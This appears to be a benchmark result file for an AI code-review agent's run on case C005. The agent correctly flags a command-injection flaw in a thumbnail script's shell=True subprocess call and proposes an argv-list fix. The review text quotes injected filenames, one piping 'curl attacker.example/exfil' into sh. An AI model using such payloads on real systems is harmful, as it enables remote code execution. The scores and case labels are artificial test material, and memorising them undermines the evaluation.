@@ -1,0 +1,92 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 46.1,
+  "setup_seconds": 0.0,
+  "total_seconds": 46.2,
+  "usage": {
+    "in": 59190,
+    "cache_read": 59392,
+    "cache_write": 0,
+    "out": 2486,
+    "source": "cli"
+  },
+  "cost_usd": 0.1511136,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "warning",
+      "body": "**Claimed critical; verifier found:** verifier off\n\n`subprocess.run(..., shell=True)` with an f-string built from `upload_dir`, `name`, and `oid` is classic command injection. A value like `name=\"img.png; id > /tmp/pwned\"` (or metacharacters in `upload_dir` / `oid`) is executed by the shell as extra commands, not as a single ImageMagick argument.\n\nImageMagick 7 policy delegates do not require shell form \u2014 keep `shell=False` and pass an argv list (absolute binary path or `\"convert\"` on PATH).\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nIf the host only provides IM7 as `magick`, use `[\"/usr/bin/magick\", \"convert\", src, dst]` still with `shell=False`."
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity": "warning",
+      "body": "**Claimed critical; verifier found:** verifier off\n\nEven aside from deliberate metacharacters, the command string leaves `{upload_dir}/{name}` and the output path unquoted. Spaces or glob characters in any segment split into multiple shell words or expand unexpectedly, so conversion targets the wrong paths and still enables injection via the same string.\n\nRestore argv form so each path is one argument regardless of content, or if a shell were ever mandatory (it is not here), pass paths via a single-argument list and `shlex.quote` every interpolation \u2014 still inferior to `shell=False`."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching a safe argv-list `subprocess.run` to `shell=True` with unescaped path interpolation.\n\n## Analysis\n\n`make_thumb` interpolates `upload_dir`, `name`, and `oid` directly into a shell command string. Any metacharacters in those values (`;`, `|`, `$(...)`, backticks, spaces, etc.) are interpreted by the shell. A crafted filename such as `x; curl attacker.example/exfil | sh` would execute arbitrary commands as the process user.\n\nThe prior form passed a fixed executable path and separate argv elements, so the kernel exec'd ImageMagick without a shell and those values could not spawn extra commands. ImageMagick 7 policy/delegate handling does not require shell form; delegates are configured in policy XML and work with the argv invocation. If `convert` must be resolved via `PATH`, keep `shell=False` and use `[\"convert\", src, dst]` (or the absolute IM7 binary path).\n\nThe diff also drops the comment that `name` was validated upstream by `ALLOWED_FILES`. This repository has no other callers or validators in-tree, so there is no evidence that `upload_dir` / `name` / `oid` are safe for shell concatenation. Even with a filename allowlist, shell form remains unnecessary risk.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "skipped",
+      "reason": "verifier off"
+    },
+    {
+      "path": "thumbs.py",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "skipped",
+      "reason": "verifier off"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 0,
+    "seconds": 0.0,
+    "verified": 0,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 2,
+    "model": "",
+    "alias": "",
+    "endpoint_kind": "",
+    "reason": "verifier off",
+    "usage": {
+      "in": 0,
+      "out": 0
+    },
+    "cost_usd": null
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 0,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
